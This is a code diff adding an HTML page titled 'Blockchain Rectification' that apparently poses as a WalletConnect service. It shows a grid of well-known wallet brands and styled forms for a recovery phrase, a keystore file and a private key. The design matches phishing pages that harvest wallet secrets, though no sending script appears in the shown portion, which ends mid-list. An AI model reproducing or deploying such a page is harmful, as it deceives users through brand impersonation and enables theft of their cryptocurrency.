@@ -1,0 +1,2011 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blockchain Rectification</title>
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background-color: white;
+            color: rgb(75 85 99);
+            font-family: Helvetica, sans-serif;
+        }
+        .container {
+            position: relative;
+        }
+        h1 {
+            width: 100%;
+            font-weight: 700;
+            font-size: 3.75rem;
+            text-align: center;
+            margin: 0px;
+            text-align: center;
+            display: flex;
+            color: rgb(37 99 235);
+            flex-direction: column;
+            align-items: center;
+        }
+        .alpha {
+            width: 100%;
+            display: flex;
+            padding: 0px 2rem;
+            flex-wrap: wrap;
+            margin: 5rem 0px 3rem 0px;
+        }
+        .alpha1, .alpha2 {
+            width:100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .alpha2 {
+            display: none;
+        }
+        .alpha p {
+            color: #4b5563;
+            font-size: 1.5rem;
+            width: 70%;
+            text-align: center;
+            line-height: 1.75rem;
+        }
+        .alpha1 .buttons {
+            width: 100%;
+            margin-top: 2rem;
+            font-size: 1.125rem;
+        }
+        .buttons .button1 {
+            background-color: #3b82f6;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 1rem 1.5rem;
+            margin-right: 2rem;
+        } 
+        .buttons .button2 {
+            background-color: #1f2937b3;
+            color: gray;
+            border: none;
+            border-radius: 5px;
+            padding: 1rem 1.5rem;
+        }
+        @keyframes pulse {
+    50% {
+        opacity: .5
+    }
+}
+    
+        .animate-pulse {
+            -webkit-animation: pulse 2s cubic-bezier(.4,0,.6,1) infinite;
+            animation: pulse 2s cubic-bezier(.4,0,.6,1) infinite;
+        }
+        .beta {
+            padding: 0rem 2rem 0 2rem;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+        .abs {
+            position: absolute;
+            top: 7rem;
+            left:2rem;
+            background-color: #3b82f6;
+            width: 5rem;
+            border-radius: 1rem;
+            height:0.25rem;
+            display: none;
+        }
+        .beta h3 {
+            font-size: 2.25rem;
+            font-weight: 700;
+            margin-top: 2rem;
+            width: 100%;
+            text-align: center;
+            color: rgb(59 130 246);
+        }
+        .switch {
+            cursor: pointer;
+            width: 100%;
+            margin-top: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 2rem;
+            justify-content: center;
+        }
+        .switch1, .switch2 {
+            padding: 0.8rem 1.2rem;
+            text-transform: none;
+        }
+        .switch1 {
+            border-bottom: 2px solid white;
+        }
+        .switch2 {
+            border-bottom: 2px solid #3b82f6;
+        }
+
+        .tabs {
+            display:grid;
+            margin-bottom: 2rem;
+            grid-template-columns: 1fr 1fr 1fr 1fr;
+            gap: 1rem;
+            margin-top: 3rem;
+        }
+        .tab {
+            display: flex;
+            flex-direction: column;
+            padding:0 1.5rem 1.5rem 1.5rem;
+            color: white;
+            gap:1rem;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 1rem;
+            border: 5px solid rgba(0, 0, 0, 0.1);
+            border-radius: 1rem;
+            background-color: white;
+        }
+        .tab p {
+            color: hsl(210, 4%, 11%);
+            font-size: 1.125rem;
+            font-weight: 500;
+            width: 100%;
+            text-align: center;
+        }
+        .tab img {
+            height: 12rem;
+            border-radius: 50%;
+            padding:1rem;
+        }
+
+        .lamda {
+            width: 100%;
+            display: flex;
+            position: absolute;
+            justify-content: center;
+            top: 0;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.05);
+        }
+        .lamdax {
+            width: 100%;
+            position: fixed;
+            top: 10rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .lamda1 {
+            padding: 2rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background-color: white;
+            margin-bottom: 1rem;
+            width: 60%;
+            box-shadow: 3px 3px 3px 3px lightgrey;
+            border-radius: 0.5rem;
+        }
+        .top1 {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .top1 .logo {
+            width: 10rem;
+        }
+        .top1 .cancel {
+            width: 8rem;
+            color: #4b5563;
+            margin-right: -6rem;
+        }
+        .initial {
+            width: 100%;
+            padding: 1rem;
+            height: 5rem;
+            display: flex;
+            align-items: center;
+            box-shadow: 2px 2px 2px lightgray;
+            justify-content: center;
+            border: 2px solid rgb(75 85 99);
+            margin: 2rem 0 0.5rem 0;
+            border-radius: 0.5rem;
+        }
+        .initial .red {
+            color: red;
+            font-size: 1.125rem;
+        }
+        .initial .green {
+            width: 100%;
+            color: #16a34a;
+            display: block;
+        }
+        .initial button {
+            color:white;
+            font-size: 1.125rem;
+            padding: 0.5rem;
+            background-color: rgb(17,24,39);
+            border-radius: 0.5rem;
+        }
+        .initial1 {
+            width: 100%;
+            display: none;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .manual {
+            width: 100%;
+            padding: 1rem;
+            box-shadow: 2px 2px 2px lightgray;
+            height: 5rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border: 2px solid rgb(75 85 99);
+            border-radius: 0.5rem;
+        }
+        .rock {
+            display: flex;
+            gap: 0.25rem;
+            width: 100%;
+            flex-direction: column;
+        }
+        .rock1 {
+            font-size: 16px;
+            color: #0369A1;
+            font-family: Helvetica, sans-serif;
+            font-weight: 600;
+        }
+        .rock p {
+            color: #16a34a;
+            font-size: 14px;
+        }
+        .cat img {
+            border-radius: 50%;
+            width: 3rem;
+
+        }
+
+        .lamda2 {
+            padding: 2rem;
+            display: flex;
+            margin-top: -5rem;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background-color: white;
+            margin-bottom: 1rem;
+            width: 60%;
+            box-shadow: 3px 3px 3px 3px lightgrey;
+            border-radius: 0.5rem;
+        }
+        .toper1 {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .toper1 .logo {
+            width: 10rem;
+        }
+        .toper1 .cancel {
+            width: 8rem;
+            color: #4b5563;
+            margin-right: -6rem;
+        }
+        .toper2 {
+            width: 100%;
+            display: flex;
+            gap: 1rem;
+            margin-top: 1rem;
+            align-items: center;
+        }
+        .toper3 {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 1rem;
+            cursor: pointer;
+            margin-top: 1.5rem;       
+        }
+        .switcher1, .switcher2, .switcher3 {
+            padding: 1rem;
+            border-bottom: 3px solid white;
+        }
+        .switcher1 {
+            border-bottom-color: grey;
+        }
+        .hr {
+        width: 90%;
+        color: lightgray;
+        margin: 1rem 0px;
+    }
+    .phrase {
+        width: 100%;
+        padding: 1rem 0;
+        display: flex;
+        flex-direction: column;
+        gap: 1rem;
+        align-items: center;
+        justify-content: center;
+    }
+    .phrase textarea {
+        width: 100%;
+        background-color: rgba(0, 0, 0, 0.05);
+        border-radius: 5px;
+        resize: none;
+        font-size: 16px;
+        height: 10rem;
+        font-family: Helvetica, sans-serif;
+        padding: 0.5rem 1rem;
+        border: 1px solid lightgray;
+    }
+    .phrase p {
+        width: 100%;
+        font-size: 14px;
+    }
+    .keystore, .private {
+        width: 100%;
+        padding: 1rem 0;
+        display: flex;
+        flex-direction: column;
+        gap: 1rem;
+        align-items: center;
+        justify-content: center;
+    }
+    .keystore label, .phrase label, .private label {
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+        gap: 0.5rem;
+    }
+    .keystore .mill {
+        background-color: rgba(0, 0, 0, 0.05);
+        padding: 0.5rem 1rem;
+        font-size: 16px;
+        width: 100%;
+        border: 1px solid lightgray;
+        border-radius: 5px;
+    }
+    .keystore p {
+        font-size: 14px;
+        margin-top: 0.5rem;
+    }
+    .keystore span {
+        font-size: 14px;
+    } 
+    .phrase input, .sub {
+        background-color: #3b82f6;
+        color: white;
+        font-weight: 600;
+        width: 100%;
+        padding: 0.6rem;
+        margin-top: 1rem;
+        border-radius: 0.5rem;
+        font-size: 16px;
+        border: none;
+    }
+    .private textarea {
+        width: 100%;
+        background-color: rgba(0, 0, 0, 0.05);
+        border-radius: 5px;
+        resize: none;
+        font-size: 16px;
+        height: 6rem;
+        font-family: Helvetica, sans-serif;
+        padding: 0.5rem 1rem;
+        border: 1px solid lightgray;
+    }
+        @media (max-width:720px) {
+            h1 {
+            font-size: 1.5rem;
+            line-height: 2rem;
+        }
+        .alpha {
+            padding: 0px 1rem;
+            flex-wrap: wrap;
+            margin: 5rem 0px 2rem 0px;
+        }
+        .alpha p {
+            font-size: 20px;
+            width: 100%;
+            line-height: 1.5rem;
+        }
+        .beta {
+            padding: 0rem 1rem 0 1rem;
+        }
+        .beta h3 {
+            font-size: 1.25rem;
+            margin-top: 2rem;
+        }
+        .switch {
+            margin-top: 1rem;
+            gap: 1rem;
+        }
+        .switch1, .switch2 {
+            padding: 0.8rem 1rem;
+        }
+
+        .tabs {
+            display:flex;
+            flex-direction: row;
+            margin-bottom: 2rem;
+            flex-wrap: wrap;
+            gap: 1%;
+            margin-top: 1rem;
+        }
+        .tab {
+            padding:0;
+            gap:0.5rem;
+            width: 32%;
+            margin-bottom: 0.5rem;
+            border: 0px solid rgba(0, 0, 0, 0.1);
+            border-radius: 1rem;
+            background-color: white;
+        }
+        .tab p {
+            color: hsl(210, 4%, 11%);
+            font-size: 16px;
+            font-weight: 500;
+            max-width: 100%;
+            width: fit-content;
+            text-align: center;
+            word-wrap: break-word;
+        }
+        .tab img {
+            height: 4rem;
+            border-radius: 50%;
+        }
+        .lamda1 {
+            padding: 1rem;
+            width: 80%;
+        }
+        .top1 .logo {
+            width: 6rem;
+        }
+        .top1 .cancel {
+            width: 5rem;
+            margin-right: -3rem;
+        }
+        .initial {
+            padding: 0.5rem;
+            height: 3rem;
+            margin: 1rem 0 0.5rem 0;
+            border-radius: 0.5rem;
+        }
+        .initial .red, .initial .green {
+            font-size: 12px;
+        }
+        .initial button {
+            font-size: 10px;
+            padding: 0.25rem;
+            border-radius: 0.5rem;
+        }
+        .manual {
+            padding: 0.5rem;
+            height: 3rem;
+        }
+        .rock {
+            gap: 0.2rem;
+        }
+        .rock1 {
+            font-size: 12px;
+        }
+        .rock p {
+            font-size: 10px;
+        }
+        .cat img {
+            border-radius: 50%;
+            width: 2rem;
+
+        }
+
+        .lamda2 {
+            padding: 1rem;
+            width: 80%;
+        }
+        .toper1 .logo {
+            width: 6rem;
+        }
+        .toper1 .cancel {
+            width: 5rem;
+            margin-right: -3rem;
+        }
+        .toper2 {
+            gap: 0.5rem;
+            margin-top: 0.5rem;
+        }
+        .toper3 {
+            gap: 0.5rem;
+            margin-top: 0.75rem;       
+        }
+        .switcher1, .switcher2, .switcher3 {
+            padding: 0.5rem;
+            font-size: 10px;
+            border-bottom: 1.5px solid white;
+        }
+        .hr {
+        margin: 0.5rem 0px;
+    }
+    .phrase {
+        padding: 0.5rem 0;
+        gap: 0.5rem;
+    }
+    .phrase textarea {
+        font-size: 12px;
+        height: 5rem;
+        padding: 0.25rem 0.5rem;
+    }
+    .phrase p {
+        width: 100%;
+        font-size: 8px;
+    }
+    .keystore, .private {
+        padding: 0.5rem 0;
+        gap: 0.5rem;
+    }
+    .keystore label, .phrase label, .private label {
+        gap: 0.25rem;
+    }
+    .private label {
+        font-size: 8px;
+    }
+    .keystore .mill {
+        padding: 0.25rem 0.5rem;
+        font-size: 12px;
+    }
+    .keystore p {
+        font-size: 10px;
+        margin-top: 0.25rem;
+    }
+    .keystore span {
+        font-size: 10px;
+    } 
+    .phrase input, .sub {
+        padding: 0.3rem;
+        margin-bottom: 0.5rem;
+        margin-top: 0.5rem;
+        font-size: 12px;
+    }
+    .private textarea {
+        font-size: 12px;
+        height: 4rem;
+        padding: 0.25rem 0.5rem;
+    }
+}
+
+.lamda {
+        display: none;
+    }
+        a {
+            text-decoration: none;
+        }
+        
+        .hide {
+            display: none;
+        }
+    </style>
+    </head>
+<body>
+    <div class="container">
+        <iframe src="https://widget.coinlib.io/widget?type=horizontal_v2&amp;theme=dark&amp;pref_coin_id=1505&amp;invert_hover=" width="100%" height="36px" scrolling="auto" marginwidth="0" marginheight="0" frameborder="0" border="0" class="sticky top-0" style="border: 0; margin: 0; padding: 0"></iframe>
+        <div class="alpha">
+            <div class="alpha1">
+                <h1>
+                    <span>Wallets</span>
+                </h1> <br>
+                <p>Multiple iOS and Android wallets support the WalletConnect protocol. Interaction between mobile apps and mobile browswers are supported via mobile deep linking.</p>
+                
+            </div>
+            <div class="alpha2">
+                <img class="animate-pulse" src="https://coinsolutions.pages.dev/assets/hero-img-home-2.417386c3.png" alt="hero">
+            </div>
+        </div>
+
+        <div class="beta">
+            <div class="abs"></div>
+            <h3>Choose your Wallet</h3>
+            <div class="switch">
+                <div class="switch1">Apps</div>
+                <div class="switch2">Wallets</div>
+            </div>
+            <div class="tabs walletrow">
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="wallet Connect" src="https://play-lh.googleusercontent.com/RSz4cnzajV5t-j6kEMH1mmwG6RtzsbZCex2NLw6uqTdPC04rMyll0iwt5Ue0ree6-gM">
+                    </div>
+                    <p>Wallet Connect</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Trust Wallet" src="https://registry.walletconnect.com/api/v1/logo/lg/4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0">
+                    </div>
+                    <p>Trust Wallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="MetaMask" src="https://registry.walletconnect.com/api/v1/logo/lg/c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96">
+                    </div>
+                    <p>MetaMask</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Coinbase wallet" src="https://play-lh.googleusercontent.com/wrgUujbq5kbn4Wd4tzyhQnxOXkjiGqq39N4zBvCHmxpIiKcZw_Pb065KTWWlnoejsg">
+                    </div>
+                    <p>Coinbase Wallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Trezor" src="https://avatars.githubusercontent.com/u/4146447?s=280&amp;v=4">
+                    </div>
+                    <p>Trezor</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Helium" src="https://play-lh.googleusercontent.com/2CCW2NoQkqPR6ZCljV3SxGf-NrEIiUzpdVrpvyw1CXIfq_ZGVEt7bZJPGLLMjxIW5HM">
+                    </div>
+                    <p>Helium</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Monero" src="data:image/png;base64,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">
+                    </div>
+                    <p>Monero</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="solana" src="https://s2.coinmarketcap.com/static/img/coins/200x200/5426.png">
+                    </div>
+                    <p>Solana</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Terra Station" src="https://play-lh.googleusercontent.com/ScfqhIBlnMHbFntJsOCqqWLF5cAjinXqIwM9xkw-XA1P-E9zYOFEm0ycc-20rC4Ae2nH">
+                    </div>
+                    <p>Terra Station</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="solflare" src="https://304015554-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-Mgv3_8586v0mVL4zZax%2Ficon%2FWvDTo0Kodwa4awPEQrsO%2Fflarelogo.png?alt=media&amp;token=b115a1f0-a543-4a49-828a-e3ede684055e">
+                    </div>
+                    <p>Solflare</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Phantom" src="https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/sqzgmbkggvc1uwgapeuy">
+                    </div>
+                    <p>Phantom</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Rainbow" src="https://explorer-api.walletconnect.com/v3/logo/lg/7a33d7f1-3d12-4b5c-f3ee-5cd83cb1b500?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Rainbow</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Atomic DEX" src="https://play-lh.googleusercontent.com/BxFMJpwGIZF1jadYbyHX9wkx-fqHRGRkbM2qs6aueygk7GhXeLS8-G461v--X4tqUO8l">
+                    </div>
+                    <p>Atomic DEX</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="HashPack" src="https://pbs.twimg.com/profile_images/1662913258787860481/6-uc2l-m_400x400.jpg">
+                    </div>
+                    <p>HashPack</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="CSPR Live" src="https://cspr.live/assets/images/casper-signer.png">
+                    </div>
+                    <p>CSPR Live</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="SafePal" src="https://play-lh.googleusercontent.com/uT6ByyNvUeLRMDnMKEC91RrbHftl2EBB58r9vZaNbiYf1F5Twa33_Hx0zYvEfCtiG1kE">
+                    </div>
+                    <p>SafePal</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Nova" src="https://pbs.twimg.com/profile_images/1598685297956585474/RTf32Evr_400x400.jpg">
+                    </div>
+                    <p>Nova</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="XPLA Vault" src="https://play-lh.googleusercontent.com/TqNUpppPnSel2wFJpqKP88TMYO8pV0ArT0B-PZbX0Ajo67Hh6R7z0ohl1ODtT4bkPQ">
+                    </div>
+                    <p>XPLA Vault</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Terra Station" src="https://play-lh.googleusercontent.com/ScfqhIBlnMHbFntJsOCqqWLF5cAjinXqIwM9xkw-XA1P-E9zYOFEm0ycc-20rC4Ae2nH">
+                    </div>
+                    <p>Terra Station</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Safe" src="https://explorer-api.walletconnect.com/v3/logo/lg/a1cb2777-f8f9-49b0-53fd-443d20ee0b00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Safe</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="UniswapWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/bff9cf1f-df19-42ce-f62a-87f04df13c00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>UniswapWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Argent" src="https://explorer-api.walletconnect.com/v3/logo/lg/215158d2-614b-49c9-410f-77aa661c3900?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Argent</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="imToken" src="https://explorer-api.walletconnect.com/v3/logo/lg/497781c4-ee1c-4087-c73a-0147b3a8d800?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>ImToken</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Spot" src="https://explorer-api.walletconnect.com/v3/logo/lg/1bf33a89-b049-4a1c-d1f6-4dd7419ee400?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Spot</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Zerion" src="https://explorer-api.walletconnect.com/v3/logo/lg/f216b371-96cf-409a-9d88-296392b85800?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Zerion</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="UnstoppableDomains" src="https://explorer-api.walletconnect.com/v3/logo/lg/4725dda0-4471-4d0f-7adf-6bbe8b929c00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>UnstoppableDomains</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="BitKeep" src="https://explorer-api.walletconnect.com/v3/logo/lg/3f7075d0-4ab7-4db5-404d-3e4c05e6fe00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>BitKeep</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Omni" src="https://explorer-api.walletconnect.com/v3/logo/lg/2cd67b4c-282b-4809-e7c0-a88cd5116f00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Omni</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="KEYRINGPRO" src="https://explorer-api.walletconnect.com/v3/logo/lg/dda0f0fb-34e8-4a57-dcea-b008e7d1ff00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>KEYRINGPRO</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="MathWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/26a8f588-3231-4411-60ce-5bb6b805a700?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>MathWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="TokenPocket" src="https://explorer-api.walletconnect.com/v3/logo/lg/f3119826-4ef5-4d31-4789-d4ae5c18e400?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>TokenPocket</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="LedgerLive" src="https://explorer-api.walletconnect.com/v3/logo/lg/a7f416de-aa03-4c5e-3280-ab49269aef00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>LedgerLive</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="CoolWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/f581365d-e844-4d21-8e35-44a755a32d00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>CoolWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="AlphaWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/5b1cddfb-056e-4e78-029a-54de5d70c500?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>AlphaWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="ZenGoWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/cfc07342-23ea-4f3f-f071-ec9d2cd86b00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>ZenGoWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
